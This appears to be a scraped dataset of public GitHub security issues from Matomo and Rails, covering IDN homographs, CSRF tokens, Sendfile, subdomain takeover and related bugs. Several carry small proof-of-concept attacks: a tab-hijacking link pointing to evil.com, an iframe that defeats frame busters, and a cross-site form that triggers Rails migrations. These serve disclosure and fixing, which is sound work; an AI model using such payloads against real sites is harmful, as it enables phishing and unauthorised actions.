The IDN (Internationalized Domain Name) : http://ebаy.com/
is a homograph for the latin ebay.com . if you click that first link, you might think that you are going to ebay.com but in fact, you are going to a homograph url http://xn--eby-7cd.com/

When such an IDN is present on profile (for ex if your follower is having access to see your profile). ,it displays IDN in Unicode. It would be safer to represent the Punycode version of the URL so that it would be apparent to the users that something wierd is going on. i.e show http://xn--eby-7cd.com/ instead of http://ebаy.com/


steps:

1. ogin

2. go to all websites

3. click on add new website and new measurable website.

4. add : http://xn--eby-7cd.com/ in the URL's

5. as a hyperlink it is shown as : http://xn--eby-7cd.com/ but it will actually take you to http://xn--eby-7cd.com/

Thanks!

Note: Since hackerone already fixed this issue, you will bot say ebay site in this report, because it is filtering the unicode characters. you can follow up with the screenshot attached or you can ask me for more information.

Thanks!

Impact
A bad guy can exploit this vulnerability by putting up a spoof site behind one of these IDN links, posting the link anywhere on Pinterest (The talk section can be a nice place) and the user or the kraken moderator/admin opens and carelessly enters his credentials there.

",,no,"c: Security,"
matomo-org/matomo,236215143,"Access issues within core update function","When updating today, I realized that Piwik doesn't follow its own access rules when applying core updates.  Anonymous internet users are able to begin the core update process once the initial step is triggered.  Crucially, they are able to see not only the version in use but also the structure of the database and which SQL queries will be performed during the update. 

For Piwik sites without a proxy server blocking off-site connections, this could be a critical vulnerability as it reveals a large amount of information about the database, extensions in use, and other software installed on the server.  Through this, a malicious visitor would be much better prepared to attack the site. 

OS: Ubuntu Trusty 14.04 x64 
Version: upgraded from version 2.16.2 to the new version 3.0.4. 

Bug posted here after conversation with security@ (enclosed as they provide a workaround):

> That's true and this could be an issue.
> 1) Would you please create an issue in our tracker here: https://github.com/piwik/piwik/issues
> 
> 2) As a workaround, we recommend to put Piwik into maintenance mode, and then run the upgrade via the console: https://piwik.org/docs/update/#database-upgrade-for-high-traffic-piwik-servers
> Thanks for your report,
> 
> Matthieu
> Piwik Security team
",,no,"c: Security,"
matomo-org/matomo,188905979,"Make tmp/ folder path configurable in config file","For added security, it would be desired for some users to store the tmp/ folder (currently: the path/to/piwik/tmp/ folder), into a custom path such as `/tmp/piwik` (outside of the website itself so that it's not accessible from internet).

 Requested in #8120 and #10706 and several times by email and in forums. ","another reason why this might be a good idea is that the debian package places the `tmp` directory inside `/usr/share/piwik`, which afaik should not contain variable data.Maybe consider using TMPDIR if it is set?
I think php has some functions you can use to get temporary directories.",no,"c: Security,"
matomo-org/matomo,227035197,"Update the logme function to use password_verify rather than compare md5 strings","The standard accounting login system seems to function correctly with password_verify. It doesn't make much sense to have the [logme function](https://piwik.org/faq/how-to/faq_30/) work on MD5. This is especially an issue because MD5 is cryptographically insecure. ","We definitely need to change this eventually. Ideally we'd include eg oauth or something but passing md5 hash is not really a solution. Especially since you basically need to have the raw password to do this. To use password_verify we'd need the raw password which is not really a solution either or do you mean passing the password hash instead? Oauth wouldn't be too much work to implement for us but of course adds some overhead for the user but be more secure as it is now.Needing the raw password at the time of authentication isn't a bad thing; you ask the user to log in to a CMS, the CMS hashes the password, does its own login, and redirects to the logme function. At least in this use case, the logme function would work out-of-the-box, without requiring the server to log the MD5 hash somewhere in their CMS and somehow redirect that to the logme function. 

To be honest, I tried to find a solution to this myself; I dug through the source code to try and find where the MD5 hash comparison was being done, to see if I could alter it to use password_verify. However, I'm very unfamiliar with Piwik's source, and accounting security is paramount so I'm wary of doing anything too cavalier with it. > Needing the raw password at the time of authentication isn't a bad thing

yes that's true. The thing is you don't want to transfer the raw password over the network via URL parameter in a GET request which may appear in access logs etc. and possibly used over HTTP is no good :)Yeah, perhaps some kinda cURL interface so it can be done via POST?

Is there any other method of remote authentication? My usage of Piwik somewhat requires a single login process, having the user log in to my CMS and then into Piwik isn't really acceptable. Password requirements aren't an issue, this is a local piwik install and I've got them set up to share passwords.A customer is asking about the logme feature and the security implications. 

Btw I added this (bold part) in the FAQ as it seems it should work to POST data (and more safe)

> Important: we recommend to make this request over https (SSL) in order to keep the password hash secure, **and we also recommend to POST the `password` and `login` URL parameters (instead of sending it as GET parameters, which may be visible in browser history and web server access logs).**

Would be valuable to have oAuth for this or otherwise  use a secure hash for the passwords for this logme feature.",no,"c: Security,"
matomo-org/matomo,1295991345,"Insecure Transport: Weak SSL Protocol in /core/Http.php","In the file /core/Http.php, there is a protocol issue.  Line 386 contains the following:

$connectHost = 'ssl://' . $connectHost;

This is an insecure method and should be changed to:

$connectHost = 'tls://' . $connectHost;

Could this be updated in a future release?  I apologize in advance if this has already been reported.  I tried digging through the issues to see if it had been reported, but was unable to find a match.","Thanks for spotting this @DHammer-PT, It doesn't seem to have been reported previously.

As it appears to be trivial fix and would improve security I've flagged it for a priority review.@tsteur are you happy for this to be scheduled as a security improvement?Is there any chance of breaking anything? If not, then could do it. If there's a chance then we'd need to look at this and do it in Matomo 5`tls://` has been supported since PHP 4.3.0

>If OpenSSL support [is installed](https://www.php.net/manual/en/openssl.installation.php), you may prefix the hostname with either ssl:// or tls:// to use an SSL or TLS client connection over TCP/IP to connect to the remote host.

https://www.php.net/manual/en/function.fsockopen.php

For what it's worth I did a quick test by modifying `Http::getTransportMethod` to always use `socket` instead of `curl` and then made the `ssl://` to `tls://` change. Retrieving plugin information in the Marketplace uses this method, a break point check confirms that the `tls://` line was used and completed without any errors.
I don't think the issue is as much of a problem with ssl:// working or not working, but rather that ssl:// is seen as obsolete and tls:// is the modern standard.  TLS is the more secure method.Do we know if `ssl://` really means ""connect with a socket using SSL 3.0""? I can find very little information about this.
But it might just be an alias as I doubt many PHP setups even support any version older than TLS 1.0. And at least on my PC openssl (3.0.3) doesn't even support any SSL 3.0 options any more.  

Also no *.matomo.org domain has supported SSL 3.0 in quite a long time, so does that mean the socket method was broken for all Matomo users for a long time now? If so, we should maybe think about removing it (as at least for me using curl feels a lot more reliable than an improvised HTTP client over a raw socket).",no,"c: Security,"
matomo-org/matomo,37353489,"Add window.name= %buster% to prevent UI redressing","This is a best practise/non critical issue, which was reported by Marcus Niemietz, a Web security researcher at the
Ruhr-University Bochum in Germany.

See the attached video for a demo of the hack. It requires a bit of user interaction.

```
Proof of Concept:
--------------------
<a
  target=""public_handle""
  href=""http://www.example.org"">
    Example.org
</a>
<a
  href=""#""
  onclick=""window.open('//evil.com', 'public_handle'); return false;"">
    Example.org
<a/>

By clicking on the first link (which is on attackers.org), there will 
be opened a window/tab with the name ""public_handle"" and the address
""example.org"". Thus, there are for examples two tabs: One from the
attacker where the above code is (attackers.org), the other with the
Piwik installation (example.org). After clicking on the ""example.org""
tab, the user will click on the tab of the attacker - for e.g. social
engineering reasons. By clicking on the second link, there will be
opened ""evil.com"" on the tab with the name ""public_handle""; therefore,
the tab with ""example.org"" will change the address to ""evil.com"". The
user is looking on this tab now (with the name ""public_handle"") and
thinks: ""Hey, I'm logged out. I will type in my username and
password."" - but this is actually the web page of the attacker.

You can use such a line of JavaScript code to fix this issue:
<script type=""text/javascript"">>window.name=""%TOKEN%"";</script>

%TOKEN% should be a server-side randomly generated string. By using
this, an attacker cannot guess the name of the window. Furthermore, a
by the attacker specified name will be overwritten.

[...]

Beside that there is another thing that you can implement:
<script type=""text/javascript"">document.designMode='off';</script>

You can find more information about it in my paper
(http://ui-redressing.mniemietz.de/uiRedressing.pdf) on the pages 33
and 34. It can be used to deactivate (no frame buster will work) and
(not documented) inject JavaScript code.

```
","Attachment: demo of non critical issue
[piwik.avi](http://issues.piwik.org/attachments/2966/piwik.avi)
Maybe stick these js snippets into the iframe buster body template?
Another note from Marcus:

```


You should at the HTTP-Header ""X-Xss-Protection: 0"" to disable the XSS
filters of IE and Chrome. They can be used to deactivate e.g.
frame-buster in the following way:

victim.html:
---
<script type=""text/javascript"">
  if (parent.frames.length > 0){
    top.location.replace(document.location);
  }
</script>

attacker.html:
---
<iframe src=""http://www.example.org/?xyz=%3Cscript%20type=%22
text/javascript%22%3Eif"">
</iframe>

The same strategy can be used to deactivate ""window.name"" or
""designMode"". Thus, you should add this header to gain a better
security.
```
If someone can submit a patch that would be appreciated.
",no,"Task,c: Security,"
matomo-org/matomo,1200752294,"Notify that requests to matomo.org will soon use HTTPS by default","This applies to all api.matomo.org and plugins.matomo.org calls.

1. First we add a new required system check showing to users if the connection over HTTPS works or not for these endpoints. If it doesn't work, then there should be an error shown explaining that we will soon switch to HTTPS by default. They should either make HTTPS work or disable HTTPS (see next item). We should mention the consequences of not fixing this issue (eventually won't receive any updates anymore big security issue for sure, and using HTTP is a minor security issue that someone could pretend there is no longer an update available)

2. We introduce a setting to force HTTP instead of HTTPS as some people won't be able to change their PHP either because the hoster doesn't allow it or because they aren't technical enough etc.

3. Create an FAQ about how to make HTTPS work or disable HTTPS and link to it in the system check error message in 1 above.

","@peterhashair did number 3 get done also regarding creating or updating the FAQs? Be good to link to that in this issue for completeness when done.FAQ here: [https://matomo.org/faq/faq-how-to-disab…omo-org-requests/](https://matomo.org/?post_type=faq&p=55687&preview=true)reopen this issue, as we discussed,  not to force users to use HTTPS at this stage, only a warning message. In the next stage we will force HTTPS connections. Ref Here: https://github.com/matomo-org/matomo-security/issues/195removing from 4.11. milestone, as the remaining tasks will be solved in a later verion.",no,"Major,Enhancement,c: Security,c: Documentation,"
rails/rails,1090726806,"Security - Subdomain Takeover at https://new.rubyonrails.org/","### Preface

I tried to reach you in every way possible, emails didn't work, no answer on HackerOne for 2 weeks - https://hackerone.com/reports/1429148

so I will try as last resort to report it here for you to fix it.

If a malicious actor would have captured it, he could store download links of rubyonrails under your main domain with crypto miners / trojan horses...

## Summary
Hi!

I discovered that new.rubyonrails.org was pointing to an unclaimed Github Page, making it vulnerable to subdomain takeover.
I've managed to claim it in my Github-account and added a simple html file as POC:

`https://new.rubyonrails.org`

## Mitigation
- Remove the DNS record

Best regards,
nagli

## Impact

Subdomain takeovers can be used for
- Cookies set to the root domain will be shared with this subdomain and can be obtained
- Stored XSS (arbitrary javascript code can be executed in a users browser)
- Phishing
- Hosting malicious content

",,no,"security,"
rails/rails,627439129,"HTML fallback for .js paths is dangerous","This issue came in from Hackerone ([here is the link](https://hackerone.com/bugs?subject=rails&report_id=167778) for those with access).  I'm filing an issue here because the Hackerone ticket is very old, and I don't see any way to actually fix the issue without definitely breaking backwards compatibility.

The issue is that controllers will fall back to HTML for `.js` requests (unless the controller uses an explicit `respond_to` handler).  For example a controller like this:

```ruby
class ContributorsController
  def index
    @contributors = if params[:release_id].present?
      set_release
      Contributor.all_with_ncommits_by_release(@release)
    else
      Contributor.all_with_ncommits
    end
  end
end
```

(I stole this code from [here](https://github.com/rails/rails-contributors/blob/d4d5066527783d9eb2c3603e08d798bd76800b50/app/controllers/contributors_controller.rb) to show this is a problem with real apps).

If someone makes a request to this with a `.js` extension, Rails will render the HTML template since there is no JS template.  If you go to [this link](https://contributors.rubyonrails.org/contributors/in-time-window/this-week.js) you can see that the HTML view is rendered even though we asked for `.js`.

The issue is that some caching proxies will see the `.js` extension and cache the response, including any authenticity tokens.  A crafty attacker could send someone a link to a Rails app that's behind a proxy like this, but with a `.js` extension.  After the victim clicks the link, the attacker can access the proxy and steal the cached authenticity token.

My personal opinion is that we should eliminate the fallback from `.js`.  If someone requests a `.js` and there is no template, we should 404 or something.  However, I'm also 99% sure that someone is relying on this behavior and we'll break apps.","My recommendation for existing apps is that people should always use `respond_to` in their controllers and limit response types.👋 Is this still considered an issue?@gurshafriri Yeah. See the open PR #39476 to track work status on this issue.",no,"security,"
rails/rails,97612173,"Add parameter filter capability for redirect locations","This is a follow up of #14055 taking in consideration @jeremy's comments.

It uses the `config.parameter_filter` to match what needs to be filtered. The result would be like this:

```
Redirected to http://secret.foo.bar?username=roque&password=[FILTERED]
```

By security default, if no filter is provided, it ~~filters all parameters~~ does not filter any parameter.

/cc @trevorturk

UPDATE: changed the default behavior.
","Thanks for picking this up, @repinel! I'm not sure that filtering all parameters by default makes sense. Don't you think filtering the same things as the existing incoming parameter filter has makes more sense? 
@trevorturk Yes. IMO, I would follow the existing behavior and keep it consistent. I'll wait for people to jump into discussion before changing it. Thanks!
r? @rafaelfranca 
@kaspth I updated it to use `fetch_header` instead of `request.env.fetch`. Thanks
This needs to be rebased. Would you mind rebase this against master and force push to your branch?
@sikachu It should be good now. Thanks
Ping @sikachu 
I have some styling comments. The rest looks fine.
@sikachu I made the changes you suggested. See if that two constants are now more readable.

Thanks for reviewing!
@repinel if this is still an issue, would you mind checking the merge conflicts?",yes,"actionpack,security,"
rails/rails,787702832,"Remove Rack::SendFile from default middleware.","### Steps to reproduce

Example of rails controller.

```ruby
class FilesController < ApplicationController
  def index
    send_file(""./README.md"")
  end
end
````

Code like the one above can be attacked by a specially crafted request.
See [hackrone](https://hackerone.com/reports/1057216) for details on the attack code.

### Actual behavior

[Rack::SendFile](https://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb) used in [send_file](https://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file) has the following risks if proxy is not set properly.

- ReDoS via Regex Injection
- Unexpected access to nginx internal


It has been suggested to remove Rack::SendFile from the default in the hope that the user will handle the proxy properly.


### System configuration
**Rails version**: *

**Ruby version**: *
","@ooooooo-q the hackerone report isn't public.@rafaelfranca Do you know if this was already addressed? Or if there's already a report filed should we close the issue?@lfalcao @zzak 

I requested disclosure of the report on hadkerone a few months ago, but it has not been supported yet.
Therefore, I don't know if it's okay to publish the details at my discretion.

Probably the same problem is reported to shopify ( https://hackerone.com/reports/1027873 ).

`Rack::SendFile` is supposed to set the proxy correctly,
It may have unintended effects as it is currently built in as Rails default middleware.

Therefore, in the hackerone report, @tenderlove suggested removing it from Rails' default middleware and asked to create an issue, so I wrote it here.
@lfalcao @zzak

The report of hackerone has been disclosed. (@rafaelfranca thank you)@ooooooo-q Thanks, would you be willing to [send a PR](https://guides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-code)?Referencing the discussion in the PR https://github.com/rails/rails/pull/42635 cc @ghiculescu

If we replace `Rack::Sendfile` with a dummy, the optional config won't set the headers anymore via `x_sendfile_header`

```ruby
Rails.application.configure do
  #...
  
  # Specifies the header that your server uses for sending files.
  # config.action_dispatch.x_sendfile_header = 'X-Sendfile' # for Apache
  # config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for NGINX
end
```
https://github.com/rails/rails/blob/d6bf7d97238c957f717dfcd1aee88aad0edd6772/actionpack/lib/action_dispatch/railtie.rb#L9
We can maybe raise a deprecation warning when the `x_sendfile_header` is explicitly set? Or directly cut it out?

Or maybe only raise deprecation warnings(when the middleware was referenced in middleware operations or  when  `x_sendfile_header` is explicitly set), without replacing `Rack::Sendfile` with a dummy to preserve the current functionality a little longer?

Either way, @eugeneius is correct. `send_file` works even without `Rack::Sendfile`

What is the best way to proceed with this? We should remove all configs that are used by `Rack::Sendfile`. Rails should not include that in the middleware stack anymore. If uses want to use `Rack::Sendfile`, and they should be able to, they will have to explicit call `use Rack::SendFile, 'X-Sendfile'`. I find the built-in Sendfile configuration to be a useful feature and it'd be a shame to see it scrubbed from Rails, even if the default configuration is too loose at present.

Instead of dropping this functionality, what about inheriting/modifying the default `Rack::Sendfile` with a version that's only configured from `production.rb` (etc) and disallows the outside headers (which seems to be the real concern)? Just a sketch:

```ruby
class ActionDispatch::Sendfile < Rack::Sendfile
  def call(env)
    if (!variation(env) && env['HTTP_X_SENDFILE_TYPE']) ||
        (@mappings.blank? && env['HTTP_X_ACCEL_MAPPING'])
      # show deprecation message that headers are no longer used, are
      # potentially insecure by default, and to switch back to native
      # Rack::Sendfile if actually wanted.
    end
    super
  end
  private
  def variation(env)
    @variation || env['sendfile.type']
  end
  def map_accel_path(env, path)
    if mapping = @mappings.find { |internal, _| internal =~ path }
      path.sub(*mapping)
    end
  end
end
```

Then, add `config.action_dispatch.x_sendfile_mapping` to configure the mappings for `ActionDispatch::Sendfile`. Generating an error when `x_sendfile_header` is present without `x_sendfile_mapping` would help apps make the transition.

An app can still to intentionally go back to `Rack::Sendfile` if its proxy is properly configured and the original behavior is wanted, but I feel this provides an easier path forward for apps that have been relying on the built-in functionality via `x_sendfile_header`.

Additionally, it helps maintain discoverability of `X-Sendfile`-like functionality for future Rails developers.> disallows the outside headers

I think this is the main issue.  How do you tell if a header is ""outside"" or not?  I don't think there's a way for Rails to know this.  Probably you could set an allow-list for internal headers, but this seems really application specific.

Have I missed something?> How do you tell if a header is ""outside"" or not?

You don't. The proposal was to take what's currently configured via the `X-Sendfile-Type` and `X-Accel-Mapping` headers and move that configuration into Rails itself, probably into `production.rb` or an initializer (likely adjacent to any existing `config.action_dispatch.x_sendfile_header` config. Then quit reading the external headers at all.

Summing up: rather than attempt to whitelist the headers, skip them entirely and provide an alternate, secured configuration mechanism.@zarqman ah yes, I think I understand.  Sorry I must have misunderstood your initial post.  It makes sense to me.  `@mappings` would come from the application configuration (if I understand correctly).",no,"actionpack,security,"
rails/rails,400379221,"ActiveStorage: no authentication for direct uploads?","The only security measure `ActiveStorage::DirectUploadsController` has is `protect_from_forgery with: :exception`. The `DirectUpload` js client fetches the csrf token from the page header to pass this security check: `this.xhr.setRequestHeader(""X-CSRF-Token"", getMetaValue(""csrf-token""))`.

Since any Rails generated pages may have this token, The door to upload files is open. Some ActiveStorage users are using ActiveStorage to provide permanent public image links. If the public link can be guessed from the blob information that `DirectUpload` js client gets, unauthorized users may be able to upload and share files.

Because a direct upload input behaves like a form, I think we should apply the idea of per form csrf token. This means each input field with `direct_upload: true` should have a direct upload csrf token. If a page has multiple such fields, these fields can share the same token. This way, only users with access to pages with direct upload fields can have this token. 

Or even better, the controller can optionally accept a proc to authenticate user. And `DirectUpload` should accordingly allow setting custom headers. This will also be useful to API only Rails apps.","This issue has been automatically marked as stale because it has not been commented on for at least three months.
The resources of the Rails team are limited, and so we are asking for your help.
If you can still reproduce this error on the `5-2-stable` branch or on `master`, please reply with all of the information you have about it in order to keep the issue open.
Thank you for all your contributions.
",no,"security,activestorage,"
rails/rails,960164852,"unsafe query generation?","### Steps to reproduce

There's a weird bug, I think it's related to unsafe query generation, and there's action controller leakage.

Similar vulnerabilities can be found with these IDS `CVE-2016-6317,CVE-2012-2660, CVE-2012-2694`
and `CVE-2013-0155.`

### Actual behavior


For example:

https://github.com/Alaa-abdulridha?tab=repositories&q[].=&type[].=1

then we could use & operator to get a new result with nil

https://github.com/Alaa-abdulridha?tab=repositories&q[].&=&type[].&=1

I believe all rails applications are vulnerable.

![image](https://user-images.githubusercontent.com/53356539/128158385-cddd0644-cf28-4726-b033-cfc0e2fe3f04.png)

```ruby
[#<ActionController::Parameters {"".""=>""""} permitted: false>]
```
```ruby
[#<ActionController::Parameters {"".""=>nil} permitted: false>]
```
I have managed to mitigate this issue, by a simple solution as below:

```ruby
def block_array_parameters
      params.each do |key, value|
        if key != 'controller' && key != 'action'
          if params[key].is_a? Array
		    key = key.gsub(/\W/, """")
            render status: 403, json: JSON.pretty_generate({ error: ""`#{key}` parameter can't be an array."" })
          end
        end
      end
    end
```


Here I made a simple project vulnerable with this bug,

https://github.com/Alaa-abdulridha/RailsApplication

![image](https://user-images.githubusercontent.com/53356539/128159585-c14776dd-cc19-4c1b-94b1-a082aa81cddc.png)

If you notice on the `application_controller.rb` file lines between 23 and 32, I've added the code above, it's not activated only if you uncommented line 3
This is a simple solution I've made just to give you an Idea maybe about how to fix it.

You can test this issue on the `home_controller` e.g. the `search` parameter and as below:

```ruby
class HomeController < ApplicationController

	def index
		@post = Post.includes(:user).where(status: 0).order(created_at: :desc).page params[:page]
	end

	def search
		if params[:search] != """"
           @results = Post.where('lower(name) iLIKE ?', ""%#{params[:search]}%"").order(:created_at)
           @user = User.where('lower(name) iLIKE ?', ""%#{params[:search]}%"").order(:created_at)
       end  
    end
end
```



The above solution will work If your controllers are inherited from the application controller, It filter all the controller's parameters.

But the issue with this solution, if your application is using the nested parameters it won't work, as below:
```ruby
      @card.name = params[:credit_card][:name]
      @card.address_line1 = params[:credit_card][:address_line1]
      @card.address_line2 = params[:credit_card][:address_line2]
```

### System configuration
**Rails version**: Latest version.

**Ruby version**: Latest version.
","Hi @Alaa-abdulridha,
Thanks for reporting the issue!

For next time, please do not report security vulnerabilities with public GitHub issue reports. See: https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#special-treatment-for-security-issues

It seems like issue should be handled by using StrongParameters:
https://edgeguides.rubyonrails.org/action_controller_overview.html#strong-parameters> Hi @Alaa-abdulridha,
> Thanks for reporting the issue!
> 
> For next time, please do not report security vulnerabilities with public GitHub issue reports. See: https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#special-treatment-for-security-issues
> 
> It seems like issue should be handled by using StrongParameters:
> https://edgeguides.rubyonrails.org/action_controller_overview.html#strong-parameters

Hi @p8 , 

Already reported it on HackerOne to rails, and they said ` We're trying to figure out the best place to fix this` also,

> tenderlove Ruby on Rails staff
> Aug 3rd (24 hrs ago)
> Hi ,
> Would you mind filing an issue for this in the public issue tracker? This seems pretty hard to understand or reproduce so I > would like to get more eyes on it.
> Thank you!

Thanks.This has been reported to HackerOne and it was decided to make it public. @Alaa-abdulridha thanks 😄",no,"actionpack,security,"
rails/rails,233811314,"Reject global csrf token if per form tokens are enabled","Currently global CSRF token can be used to override per-form CSRF token. This PR changes that. If per-form CSRF tokens are enabled, an actual per-form CSRF token has to be passed to avoid `InvalidAuthenticityToken`.","Thanks for the pull request, and welcome! The Rails team is excited to review your changes, and you should hear from @pixeltrix (or someone else) soon.

If any changes to this PR are deemed necessary, please add them as extra commits. This ensures that the reviewer can see what has changed since they last reviewed the code. Due to the way GitHub handles out-of-date commits, this should also make it reasonably obvious what issues have or haven't been addressed. Large or tricky changes may require several passes of review and changes.

This repository is being automatically checked for code quality issues using <a href=""https://codeclimate.com"">Code Climate</a>. You can see results for this analysis in the PR status below. Newly introduced issues should be fixed before a Pull Request is considered ready to review.

Please see [the contribution instructions](http://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html) for more information.
cc/ @rails/security Hey @kv109 I cloned the repo in the original issue, made a new scaffold for User. I then opened 2 tabs and pasted the CSRF token from Post into User and saw invalid authenticity token, as expected.

Do you have a repo that reproduces the issue you're seeing that you could share?Hi @eileencodes!

Link to [repo](https://github.com/kv109/per-form-csrf-test).
[Screencast](https://www.youtube.com/watch?v=05RTefpaFss&feature=youtu.be) with copy-pasting token.

### Steps to create the app
```bash
Kacpers-MacBook-Pro:tmp kacperwalanus$ rvm current
ruby-2.4.1
```
```bash
Kacpers-MacBook-Pro:tmp kacperwalanus$ rails -v
Rails 5.1.1
```
```bash
Kacpers-MacBook-Pro:tmp kacperwalanus$ rails new per-form-csrf
      create
      create  README.md
      create  Rakefile
      create  config.ru
      create  .gitignore
      create  Gemfile
         run  git init from "".""
Initialized empty Git repository in /Users/kacperwalanus/projects/tmp/per-form-csrf/.git/
      create  app
      create  app/assets/config/manifest.js
      #...
      create  package.json
      remove  config/initializers/cors.rb
      remove  config/initializers/new_framework_defaults_5_1.rb
         run  bundle install
The dependency tzinfo-data (>= 0) will be unused by any of the platforms Bundler is installing for. Bundler is installing for ruby but the dependency is only for x86-mingw32, x86-mswin32, x64-mingw32, java. To add those platforms to the bundle, run `bundle lock --add-platform x86-mingw32 x86-mswin32 x64-mingw32 java`.
Fetching gem metadata from https://rubygems.org/.........
Fetching version metadata from https://rubygems.org/..
Fetching dependency metadata from https://rubygems.org/.
Resolving dependencies...
Using rake 12.0.0
Using concurrent-ruby 1.0.5
Using i18n 0.8.4
Using minitest 5.10.2
Using thread_safe 0.3.6
Using builder 3.2.3
Using erubi 1.6.0
Using mini_portile2 2.2.0
Using rack 2.0.3
Using nio4r 2.1.0
Using websocket-extensions 0.1.2
Using mime-types-data 3.2016.0521
Using arel 8.0.0
Using public_suffix 2.0.5
Using bindex 0.5.0
Using bundler 1.14.6
Using byebug 9.0.6
Using ffi 1.9.18
Using coffee-script-source 1.12.2
Using execjs 2.7.0
Using method_source 0.8.2
Using thor 0.19.4
Using multi_json 1.12.1
Using rb-fsevent 0.9.8
Using ruby_dep 1.5.0
Using puma 3.9.1
Using rubyzip 1.2.1
Using sass 3.4.24
Using tilt 2.0.7
Using websocket 1.2.4
Using sqlite3 1.3.13
Using turbolinks-source 5.0.3
Using tzinfo 1.2.3
Using nokogiri 1.8.0
Using rack-test 0.6.3
Using sprockets 3.7.1
Using websocket-driver 0.6.5
Using mime-types 3.1
Using addressable 2.5.1
Using childprocess 0.7.0
Using rb-inotify 0.9.8
Using coffee-script 2.4.1
Using uglifier 3.2.0
Using turbolinks 5.0.1
Using activesupport 5.1.1
Using loofah 2.0.3
Using xpath 2.1.0
Using mail 2.6.5
Using selenium-webdriver 3.4.0
Using listen 3.1.5
Using rails-dom-testing 2.0.3
Using globalid 0.4.0
Using activemodel 5.1.1
Using jbuilder 2.7.0
Using spring 2.0.2
Using rails-html-sanitizer 1.0.3
Installing capybara 2.14.0
Using activejob 5.1.1
Using activerecord 5.1.1
Using spring-watcher-listen 2.0.1
Using actionview 5.1.1
Using actionpack 5.1.1
Using actioncable 5.1.1
Using actionmailer 5.1.1
Using railties 5.1.1
Using sprockets-rails 3.2.0
Using coffee-rails 4.2.2
Using web-console 3.5.1
Using rails 5.1.1
Using sass-rails 5.0.6
Bundle complete! 16 Gemfile dependencies, 70 gems now installed.
Use `bundle show [gemname]` to see where a bundled gem is installed.
         run  bundle exec spring binstub --all
* bin/rake: spring inserted
* bin/rails: spring inserted
```

```bash
cd per-form-csrf
```

```bash
bin/rails g scaffold Post title:string
Running via Spring preloader in process 44419
      invoke  active_record
      create    db/migrate/20170607134728_create_posts.rb
      create    app/models/post.rb
      # ...
```

```bash
bin/rails g scaffold User name:string
Running via Spring preloader in process 44443
      invoke  active_record
      create    db/migrate/20170607134730_create_users.rb
      create    app/models/user.rb
      # ...
```
```bash
bin/rails db:migrate
Kacpers-MacBook-Pro:per-form-csrf kacperwalanus$ bin/rails db:migrate
== 20170607134728 CreatePosts: migrating ======================================
-- create_table(:posts)
   -> 0.0008s
== 20170607134728 CreatePosts: migrated (0.0009s) =============================

== 20170607134730 CreateUsers: migrating ======================================
-- create_table(:users)
   -> 0.0008s
== 20170607134730 CreateUsers: migrated (0.0009s) =============================
```
@eileencodes were you able to reproduce this?
#pingingPolitelyHey sorry for the delay @kv109. So I have looked at this and it seems that when you refresh the page the token is replaced by the global token. This is because of JS we have that does that replacement https://github.com/rails/rails/blob/master/actionview/app/assets/javascripts/rails-ujs/utils/csrf.coffee.

This is a bug but I'm not sure how to fix it. Your fix provided here will reject all requests on refresh so it's not the right solution. I don't know if we can skip that js specifically for per-form tokens - we would have to change the token somehow. Let me know if you have any idea.@eileencodes Do you know the history of the JS in `csrf.coffee`? In what scenario would JS be required in this process? Is it for AJAX only?

I verified in two ways that in the use case presented by @kv109, JS is not needed to enforce per-form tokens. One is by disabling JS in the browser and trying the same thing @kv109 did (copy the token from one form to the other), and you will get the `InvalidAuthenticityToken` error as expected.

Alternatively, you can leave JS enabled in the browser, but remove `//= require rails-ujs` from `application.js`, and you will get the expected error in that scenario as well.@monfresh yes I do know the history and it's for ajax cached forms. Here's the original PR https://github.com/rails/jquery-ujs/pull/350
I can still reproduce this using Rails 6.1.4.",yes,"security,rails-ujs,"
rails/rails,771518021,"CSRF ActionableExceptions middleware","https://github.com/rails/rails/blob/v6.1.0/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb

XSS with ActionableExceptions has been fixed in 6.0.3.4, but there is still an issue with accepting cross site requests.
Therefore, there are the following problems in the development environment.

I suggest limiting the requests this middleware accepts to ajax requests with custom headers (x-requested-with).

For more information [hackerone](https://hackerone.com/reports/904059).

### Steps to reproduce

example attack server.

```html
<form method=""post"" action=""http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/"">
    <button type=""submit"">click!</button>
</form>
```

### Expected behavior

Block cross site request.

### Actual behavior

- Run pending migrations by CSRF
- Open redirect (from POST method)
- HTTP header injection

### System configuration

**Rails version**: 6.1.0

**Ruby version**: ruby 2.7.1p83","Sorry. HTTP header injection was fixed in 6.0.3.4.",no,"actionpack,security,"
rails/rails,319052027,"Request Forgery takes relative paths into account","Passing relative paths into form_for and related / derived helpers led to invalid
token generations, as the tokens did not match the request.path on the
POST endpoint. Variants, such as:

```
form_for url: """" do
```

Wouldn't generate a matching csrf-token and led to an InvalidAuthenticityToken.

I've added test + code to handle the common cases, such as:

* """"
* ""./""
* ""./post_one""
* ""post_one""

are now handled according to [RFC 3986 5.2 - 5.4](https://tools.ietf.org/html/rfc3986#section-5.2). 


Not implemented from RFC: double dots are not handled (../../path)

relevant/ fixing issue: #31191
","Hello Rails team, 
Please give your attention to this PR!

I also stumbled upon the bug this PR is designed to fix.
I wasted half a day by digging into actionpack/lib/action_controller/metal/request_forgery_protection.rb to know `per_form_csrf_tokens` is the culprit... (I learnt a lot about rails csrf protection mechanism though, thanks ;-)

Also, I think it also has a security concern because if user developers of Rails cannot do workaround the bug and decided to turn off `protect_from_forgery`... Can you imagine?@eileencodes not sure if you're aware of this PR or the linked issue or if you think it makes sense for either to have the security label.@hiroshi You can just `form_for url: request.path` as @zealot128 suggested, don't disable it just yet :)> You can just form_for url: request.path as @zealot128 suggested, don't disable it just yet :)

The problem is not how to avoid the pitfall. I learnt where the pitfall is at least, but others can fall.
Why don't you just remove the pitfall?
A collegue ran into this bug again in production, after not receiving after upgrading a older client Rails app to later Rails versions... This bug might slip through test, because by default in Test there is no CSRF protection enabled.

Could a maintainer please check if this could be merged? :) 

Pinging @rafaelfranca and @amatsuda because both of you had merges in that code region. Please tell me, if there is a chance to have this merged/fixed.

",yes,"actionpack,security,"
